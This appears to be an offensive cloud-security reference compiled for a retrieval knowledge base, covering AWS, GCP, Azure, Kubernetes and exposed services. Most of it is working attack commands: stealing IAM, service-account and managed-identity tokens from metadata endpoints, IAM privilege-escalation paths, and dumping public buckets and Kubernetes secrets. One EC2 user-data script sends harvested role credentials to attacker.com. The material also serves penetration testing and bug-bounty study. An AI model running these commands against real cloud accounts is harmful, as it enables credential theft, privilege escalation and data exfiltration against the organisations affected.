# Cloud Security Attacks — AWS, GCP, Azure
> Source: hackingthe.cloud, AWS/GCP/Azure documentation | RAG Knowledge Base | Full detail preserved

---

## AWS Attack Surface Index (hackingthe.cloud)

### AWS Enumeration Techniques

| Technique | Description |
|---|---|
| Enumerate AWS Account ID from EC2/S3 | Get account ID without credentials via error messages |
| Brute Force IAM Permissions | Use tools like `enumerate-iam` to discover allowed actions |
| Bypass Cognito Account Enumeration | Timing/error differences reveal valid usernames |
| Detect Public Resources via Session Policy | Error message differences leak resource exposure |
| Discover Secrets in Public AMIs | AMIs may contain keys, passwords, config in userdata |
| Unauthenticated IAM User/Role Enumeration | Use `sts:AssumeRole` errors to confirm ARNs exist |
| Derive Principal ARN from AWS Unique ID | Convert AKIA/ASIA/AROA prefix to full ARN |
| Enumerate Root Email from AWS Console | Password reset flow leaks partial email |
| Loot Public EBS Snapshots | Public snapshots contain full disk data |
| Get Account ID from AWS Access Keys | `sts:GetCallerIdentity` with any valid key |

### AWS Exploitation Techniques

| Technique | Description |
|---|---|
| Steal EC2 Metadata Credentials via SSRF | IMDSv1 reachable via SSRF at 169.254.169.254 |
| AWS IAM Privilege Escalation | 40+ paths from limited IAM perms to admin |
| Steal IAM Credentials from Lambda | Lambda env vars contain role credentials |
| EC2 Privilege Escalation via User Data | Modify user data to run code with role |
| DNS/CloudFront Takeover via Deleted S3 | CNAME to deleted bucket → re-register bucket |
| AWS API Call Hijacking via ACM-PCA | Intercept API calls via rogue certificate authority |
| Exfiltrate S3 via Bucket Replication | Copy data to attacker-controlled bucket |
| Abusing Misconfigured ECR Resource Policies | Pull/push container images without auth |
| Abusing Wildcard Role Trust Policies | `"Principal": "*"` in role trust policy |
| Exploiting Misconfigured OIDC IAM Roles | GitLab/Terraform Cloud OIDC → AWS IAM access |

### AWS Avoid Detection

- Bypass GuardDuty Pentest Findings via botocore config
- Bypass GuardDuty Tor Client Findings
- Modify GuardDuty configuration to suppress findings
- Bypass Credential Exfiltration Detection

### AWS Post-Exploitation

- Create Console Session from IAM Credentials
- IAM Persistence Methods (backdoor users, roles, policies)
- IAM Persistence through Eventual Consistency
- IAM Rogue OIDC Identity Provider Persistence
- IAM Roles Anywhere Persistence
- Intercept SSM Communications
- Lambda Persistence
- Role Chain Juggling
- Run Shell Commands via Send Command or Session Manager
- S3 File ACL Persistence
- Survive Access Key Deletion with `sts:GetFederationToken`
- User Data Script Persistence

---

## AWS: S3 Bucket Misconfiguration

S3 buckets can be made public via three mechanisms:
1. Block Public Access settings disabled at bucket or account level
2. Bucket ACL set to `public-read` or `public-read-write`
3. Bucket Policy granting `s3:GetObject` to `"Principal": "*"`

**Common Vulnerable Bucket Policy:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::vulnerable-bucket/*"
  }]
}
```

**Enumerating and Exploiting Public Buckets:**
```bash
# Check if bucket is public
curl https://BUCKET-NAME.s3.amazonaws.com/
curl https://s3.amazonaws.com/BUCKET-NAME/

# List bucket contents (if public)
aws s3 ls s3://BUCKET-NAME/ --no-sign-request

# Download all objects
aws s3 sync s3://BUCKET-NAME/ . --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket BUCKET-NAME --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket BUCKET-NAME --no-sign-request
```

**Common Sensitive Files in S3 Buckets:**
- `.env` files with API keys
- `config.js` with hardcoded credentials
- `*.sql`, `*.bak`, `database.tar.gz` backup files
- `.git/` directories with full commit history
- Log files with authentication tokens

**DNS and CloudFront Domain Takeover via Deleted S3 Buckets:**
If a CNAME points to a deleted S3 bucket (e.g., `files.example.com CNAME files.example.com.s3-website.us-east-1.amazonaws.com`), an attacker can re-create the bucket with the same name and serve arbitrary content under the legitimate domain.

---

## AWS: IMDS (Instance Metadata Service) — SSRF Attack

The IMDS is accessible only from within the EC2 instance at `169.254.169.254`. SSRF vulnerabilities allow reaching it from outside.

### IMDSv1 — Simple GET, No Token (Vulnerable)

```bash
# Check if IAM role is attached
curl http://169.254.169.254/latest/meta-data/iam/
# 404 = no role attached; 200 = role present

# Get the IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials for the role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
```

**Credential Response JSON:**
```json
{
  "Code": "Success",
  "LastUpdated": "2023-01-01T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...(session token)...",
  "Expiration": "2023-01-01T06:00:00Z"
}
```

**Full IMDS Path Listing:**
```
/latest/meta-data/ami-id
/latest/meta-data/instance-id
/latest/meta-data/instance-type
/latest/meta-data/iam/security-credentials/
/latest/meta-data/public-ipv4
/latest/meta-data/placement/
/latest/user-data          ← often contains secrets/scripts
/latest/meta-data/tags/    ← may contain env/app info
```

### IMDSv2 — Session-Oriented (Mitigates SSRF)

```bash
# Step 1: Get token (valid up to 6 hours = 21600 seconds)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token for all requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# Get IAM credentials with token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
```

**Why IMDSv2 Blocks SSRF:**
- Requires a `PUT` request with `X-aws-ec2-metadata-token-ttl-seconds` header
- PUT requests containing `X-Forwarded-For` are rejected (blocks proxy/SSRF)
- TTL hop limit defaults to 1 at IP level — token cannot traverse network hops
- SSRF via plain GET without token receives `401 Unauthorized`

**IPv6 IMDS endpoint (Nitro instances in IPv6 subnets):**
`http://[fd00:ec2::254]/latest/meta-data/`

### Using Stolen IAM Credentials

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalr..."
export AWS_SESSION_TOKEN="AQoD..."

aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-groups-for-user --user-name USERNAME
aws iam list-attached-role-policies --role-name ROLENAME
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

---

## AWS: IAM Privilege Escalation Paths

Source: Spencer Gietzen (Rhino Security Labs), Seth Art (`iam-vulnerable` tool)

### Direct Policy Manipulation Escalations

| Permission | Escalation Method |
|---|---|
| `iam:AttachUserPolicy` | Attach `AdministratorAccess` to own user |
| `iam:AttachRolePolicy` | Attach `AdministratorAccess` to accessible role |
| `iam:AttachGroupPolicy` | Attach `AdministratorAccess` to own group |
| `iam:PutUserPolicy` | Create inline policy granting admin access |
| `iam:PutRolePolicy` | Create inline role policy |
| `iam:PutGroupPolicy` | Create inline group policy |
| `iam:CreatePolicyVersion` | Create new policy version with elevated permissions |
| `iam:SetDefaultPolicyVersion` | Revert to previous policy version with more access |
| `iam:AddUserToGroup` | Add controlled user to privileged group |
| `iam:CreateAccessKey` | Generate access keys for more privileged user |
| `iam:CreateLoginProfile` | Create console password for privileged user |
| `iam:UpdateLoginProfile` | Change password of privileged user |
| `iam:UpdateAssumeRolePolicy` | Modify role trust policy to allow self to assume it |
| `iam:DeleteUserPermissionsBoundary` | Remove permissions boundary to expand effective perms |
| `iam:DeleteRolePermissionsBoundary` | Remove role permissions boundary |
| `iam:DeleteUserPolicy` | Delete deny-based inline policy |
| `iam:DeleteRolePolicy` | Delete deny-based role inline policy |
| `iam:DetachUserPolicy` | Detach deny-based managed policy |
| `iam:DetachRolePolicy` | Detach deny-based role managed policy |

### PassRole + Service Execution Escalations

| Permissions Required | Escalation Method |
|---|---|
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with privileged role, extract creds via user-data |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create+invoke Lambda with elevated role |
| `lambda:UpdateFunctionCode` | Modify existing Lambda function code to exfil role creds |
| `lambda:UpdateFunctionConfiguration` | Add malicious Lambda Layer |
| `iam:PassRole` + `glue:CreateDevEndpoint` | Create Glue dev endpoint with elevated role, SSH in |
| `glue:UpdateDevEndpoint` | Update existing Glue endpoint SSH key |
| `iam:PassRole` + `glue:CreateJob` / `glue:UpdateJob` | Create/update Glue job with privileged role |
| `iam:PassRole` + `cloudformation:CreateStack` | Create CloudFormation stack with privileged role |
| `iam:PassRole` + `ecs:RunTask` | Launch Fargate task with elevated role, override command |
| `iam:PassRole` + `datapipeline:CreatePipeline` + activate | Create pipeline with elevated role |
| `iam:PassRole` + `autoscaling:CreateAutoScalingGroup` | Pass privileged role to auto-scaling instances |
| `iam:PassRole` + `bedrock-agentcore:CreateCodeInterpreter` + invoke | Execute code with passed role permissions |
| `iam:PassRole` + `codestar:CreateProject` | Create CodeStar project with elevated role |
| `codestar:CreateProject` + `codestar:AssociateTeamMember` | Associate as Owner to get Lambda/IAM access |

**EC2 User-Data Credential Exfiltration (common `iam:PassRole` + `ec2:RunInstances` abuse):**
```bash
#!/bin/bash
# User-data script runs on instance start as root
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
curl -X POST https://attacker.com/collect -d "$CREDS"
```

**ECS Fargate Task Escalation:**
```bash
aws ecs run-task \
  --cluster TARGET-CLUSTER \
  --task-definition TARGET-TASK-DEF \
  --overrides '{"containerOverrides":[{"name":"app","command":["sh","-c","curl $ECS_CONTAINER_METADATA_URI_V4/credentials"]}]}' \
  --network-configuration "awsvpcConfiguration={assignPublicIp=ENABLED,subnets=[subnet-xxx]}"
```

---

## AWS: Cognito Misconfiguration

**Attack Vectors:**
1. **Unintended Self-Signup:** `AllowAdminCreateUserOnly=false` allows anyone to create accounts
2. **Overpermissioned Identity Pools:** Identity Pools grant overly broad IAM roles to unauthenticated/new users
3. **Account Enumeration:** Timing/error differences reveal valid usernames

```bash
# Test self-signup
aws cognito-idp sign-up \
  --client-id CLIENT_ID \
  --username test@attacker.com \
  --password Password123!

# Get Identity Pool credentials after account creation
aws cognito-identity get-id \
  --account-id ACCOUNT_ID \
  --identity-pool-id us-east-1:POOL-ID \
  --logins '{"cognito-idp.us-east-1.amazonaws.com/USER-POOL-ID":"ID_TOKEN"}'

aws cognito-identity get-credentials-for-identity \
  --identity-id IDENTITY_ID \
  --logins '{"cognito-idp.us-east-1.amazonaws.com/USER-POOL-ID":"ID_TOKEN"}'
```

---

## AWS: Exposed Lambda Functions

**Attack Surface:**
- Lambda URLs with `AuthType: NONE` — publicly accessible without authentication
- API Gateway endpoints triggering Lambda without authorization
- Lambda environment variables often contain secrets (DB passwords, API keys, cross-account credentials)

**Stealing Lambda Credentials from Inside Execution Context:**
```bash
# IAM role creds exposed as env vars inside Lambda
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN

# Or via container metadata endpoint
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

---

## GCP: Metadata Server (computeMetadata/v1/)

**Endpoints:**
- `http://169.254.169.254/computeMetadata/v1/`
- `http://metadata.google.internal/computeMetadata/v1/`

**Required Header:** `Metadata-Flavor: Google` (without this, server returns 403)

**Full GCP Metadata Enumeration:**
```bash
# List all metadata recursively
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
  -H "Metadata-Flavor: Google"

# Get service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# Get service account access token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Returns: {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}

# Get project ID
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"

# List all service accounts
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
  -H "Metadata-Flavor: Google"

# Get SSH keys (project-level)
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" \
  -H "Metadata-Flavor: Google"

# Get startup script (may contain secrets)
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" \
  -H "Metadata-Flavor: Google"
```

**Using Stolen GCP Token:**
```bash
# Enumerate accessible GCS buckets
curl "https://www.googleapis.com/storage/v1/b?project=PROJECT_ID" \
  -H "Authorization: Bearer ACCESS_TOKEN"

# List IAM policies
curl "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:getIamPolicy" \
  -X POST -H "Authorization: Bearer ACCESS_TOKEN" -H "Content-Type: application/json" -d "{}"

# List GCP projects
curl "https://cloudresourcemanager.googleapis.com/v1/projects" \
  -H "Authorization: Bearer ACCESS_TOKEN"
```

**Exposed GCS Buckets:**
```bash
# Check public read
curl "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o"

# Download all objects
gsutil -m cp -r gs://BUCKET_NAME/ .
```

**Service Account Key JSON Format (leaked from repos/code):**
```json
{
  "type": "service_account",
  "project_id": "my-project",
  "private_key_id": "key123",
  "private_key": "-----BEGIN RSA PRIVATE KEY-----\n...",
  "client_email": "sa@my-project.iam.gserviceaccount.com",
  "client_id": "123456789",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token"
}
```

```bash
gcloud auth activate-service-account --key-file=leaked-key.json
gcloud projects list
gcloud iam service-accounts list --project=PROJECT_ID
```

**GCP Privilege Escalation — hackingthe.cloud techniques:**
- GCP Cloud Workstations Privilege Escalation
- Tag-based privilege escalation
- Default service account abuse
- Compute Engine service account access

---

## Azure: IMDS and Managed Identity Abuse

**Azure IMDS Basic Query:**
```bash
# Get all instance metadata
curl -s -H "Metadata: true" --noproxy "*" \
  "http://169.254.169.254/metadata/instance?api-version=2025-04-07" | jq
```

**Azure Managed Identity Token Acquisition via IMDS:**
```bash
# Get access token for Azure Resource Manager
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true" -s

# Get token for Microsoft Graph API
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
  -H "Metadata: true" -s

# Get token for Azure Key Vault
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  -H "Metadata: true" -s

# Parse token in bash
response=$(curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H Metadata:true -s)
access_token=$(echo $response | python -c 'import sys, json; print(json.load(sys.stdin)["access_token"])')
```

**Azure App Service / Container Environment Variables:**
```bash
echo $IDENTITY_ENDPOINT    # e.g., http://169.254.130.3:8081/msi/token
echo $IDENTITY_HEADER      # Secret header value

curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" \
  -H "secret: $IDENTITY_HEADER"
```

**Using Stolen Azure Token (PowerShell):**
```powershell
Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>
Get-AzResource
Get-AzRoleAssignment
Get-AzStorageAccountKey -ResourceGroupName "target-rg" -AccountName "targetstorageacc"
```

---

## Azure: Blob Storage Public Access

**Container Permission Levels:**
1. **Private** — no anonymous access
2. **Blob** — anonymous read of individual blobs if full URL known
3. **Container** — anonymous directory listing + blob download (most dangerous)

**Exploitation:**
```bash
# List all blobs in a public container
curl "https://STORAGEACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
# Returns XML with blob names, timestamps, content lengths, ETags

# Download a specific blob
curl -O "https://STORAGEACCOUNT.blob.core.windows.net/CONTAINER/filename.pdf"

# MicroBurst PowerShell enumeration
Invoke-EnumerateAzureBlobs -Base STORAGEACCOUNT
```

**Common Container Names to Try:**
`backup`, `backups`, `data`, `files`, `uploads`, `public`, `assets`, `images`, `logs`, `documents`, `exports`, `dump`, `database`

**Azure Techniques (hackingthe.cloud):**
- Abusing Managed Identities
- Anonymous Blob Access
- Unauthenticated Enumeration of Azure AD Email Addresses
- Run Command Abuse
- Soft Deleted Blobs recovery

---

## Kubernetes API Server Exposure

```bash
# Check if API server is exposed (default port 6443 HTTPS, 8080 HTTP)
curl -k https://TARGET:6443/api/v1/namespaces/default/pods
curl http://TARGET:8080/api/v1/pods

# If anonymous access allowed
kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify get pods --all-namespaces
kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify get secrets --all-namespaces

# Steal service account token for escalation
kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify \
  exec -it POD_NAME -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## Exposed Management Interfaces

**Grafana (port 3000):**
- Default creds: `admin/admin`
- Anonymous access sometimes enabled
- API leaks data source credentials: `GET /api/datasources`
- SSRF via `/api/datasources/proxy/ID/...`

**Prometheus (port 9090):**
- `GET /metrics` — exposes internal metrics
- `GET /api/v1/targets` — reveals internal services
- `GET /api/v1/query?query=...` — queries metric data

**Jenkins (port 8080):**
- Script console RCE: `POST /script` with Groovy payload
- Credential leakage: `GET /credentials/store/system/domain/_/credential/ID/`
- Build logs may contain secrets

**Elasticsearch (port 9200):**
```bash
curl http://TARGET:9200/
curl http://TARGET:9200/_cat/indices
curl http://TARGET:9200/INDEX_NAME/_search?size=100
curl http://TARGET:9200/_cluster/state
```

**Exposed `.git` directory:**
```bash
curl https://target.com/.git/config    # Detect
curl https://target.com/.git/HEAD

# Full reconstruction with GitTools
./gitdumper.sh https://target.com/.git/ /tmp/output/
git -C /tmp/output log --all --oneline
```

---

## Cloud Security Bug Bounty Quick Reference

| Attack | Cloud Service | Severity |
|---|---|---|
| SSRF → IMDS v1 → IAM creds | AWS EC2 | Critical |
| SSRF → IMDS → SA token | GCP | Critical |
| SSRF → Managed Identity token | Azure | Critical |
| Public S3 bucket with secrets | AWS | High–Critical |
| Public GCS bucket with secrets | GCP | High–Critical |
| Anonymous Azure Blob Container | Azure | High |
| IAM key in public GitHub repo | AWS/Any | Critical |
| Cognito self-signup + overpermissioned role | AWS | High |
| Unauthenticated Kubernetes API | Any cloud | Critical |
| Jenkins script console no auth | Any | Critical |
| Elasticsearch open on 9200 | Any | High |
| Lambda URL with AuthType:NONE | AWS | Medium–High |
| Grafana default creds | Any | High |
| CloudFront/S3 subdomain takeover | AWS | High |
